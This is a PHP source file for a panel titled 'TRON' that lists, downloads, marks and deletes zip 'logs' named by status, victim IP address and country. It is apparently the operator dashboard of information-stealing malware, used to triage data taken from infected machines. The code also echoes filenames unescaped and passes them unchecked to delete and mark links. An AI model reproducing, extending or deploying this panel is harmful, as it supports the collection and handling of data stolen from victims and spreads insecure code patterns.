<?php
include ("settings.php");

if ($_COOKIE["session"] !== $session_key)
{
    header("Location:  login.php");
    die();
}

$dirname = "files";
$files = array_filter(scandir(__DIR__ . "/files") , function ($elem)
{
    return preg_match("/^[[\S]+](?:\d{1,3}\.){4}[ \w]+.zip$/u", $elem);
});

$dates = [];
$dates2 = [];

foreach ($files as $filename)
{
    if (stristr($filename, '[Checked]') === false)
    {
        $dates[$filename] = filectime(__DIR__ . "/files/$filename");
        arsort($dates);
    }
}

foreach ($files as $filename)
{
    if (stristr($filename, '[Unchecked]') === false)
    {
        $dates2[$filename] = filectime(__DIR__ . "/files/$filename");
        arsort($dates2);
    }
}

$files = array_keys($dates);
$files2 = array_keys($dates2);

?>
<!DOCTYPE html>
<html>

	<head>
		<link rel="stylesheet" href="css/common.css">
		<link rel="stylesheet" href="css/table.css">
		<meta http-equiv="Refresh" content="30" />
		<meta charset="utf-8">
		<title>TRON</title>
	<head>
	
	<body>
	
		<div id="wrapper">
                     <div id="main">
		
			<div id="sidenav">
				<a href="pack.php" onclick="return confirm('Download all logs?')">Download</a>
				<a href="deleteall.php" onclick="return confirm('Delete all logs?')">Delete</a>
				<a href="logout.php">Logout</a>
				<h4 style="text-align: center; margin-top: 50px; color: #15adce; letter-spacing: 2px;">Total: <?php echo count($files) + count($files2) ?></h4>
			</div>
			
			<table>
				<tr>
					<th>Status</th><th>IP</th><th>Country</th><th>Size</th><th>Date</th><th>Actions</th>
				</tr>
				<?php
foreach ($files as $filename)
{
    preg_match("/(?<status>[[\S]+])(?<ip>(?:\d{1,3}\.){4})(?<country>[ \w]+)/u", $filename, $props);
    echo "<tr style='color: #15adce'>\n";
    echo "<td>$props[status]</td>\n";
    echo "<td><a href=\"files/$filename\">" . trim($props["ip"], ".") . "</a></td>\n";
    echo "<td>$props[country]</td>\n";
    echo "<td align=\"center\">" . round(filesize(__DIR__ . "/files/$filename") / 1024, 2) . " KB</td>\n";
    echo "<td align=\"center\">" . date("H:i d.m.y", filectime(__DIR__ . "/files/$filename")) . "</td>\n";

    echo "<td style=\"font-family: 'TRON LEGACY', sans-serif; letter-spacing: 2px;\"><a href=\"mark.php?file=$filename\">MARK</a>   <a href=\"delete.php?file=$filename\">DEL</a></td>\n";
    echo "</tr>";

}

foreach ($files2 as $filename)
{
    preg_match("/(?<status>[[\S]+])(?<ip>(?:\d{1,3}\.){4})(?<country>[ \w]+)/u", $filename, $props);

    echo "<tr style='color: #9c9c9c'>\n";
    echo "<td>$props[status]</td>\n";
    echo "<td><a href=\"files/$filename\">" . trim($props["ip"], ".") . "</a></td>\n";
    echo "<td>$props[country]</td>\n";
    echo "<td align=\"center\">" . round(filesize(__DIR__ . "/files/$filename") / 1024, 2) . " KB</td>\n";
    echo "<td align=\"center\">" . date("H:i d.m.y", filectime(__DIR__ . "/files/$filename")) . "</td>\n";

    echo "<td style=\"font-family: 'TRON LEGACY', sans-serif; letter-spacing: 2px;\"><a href=\"mark.php?file=$filename\">MARK</a>   <a href=\"delete.php?file=$filename\">DEL</a></td>\n";
    echo "</tr>";

}
?>
			</table>
			
		</div>
                </div>
		
	</body>
</html>
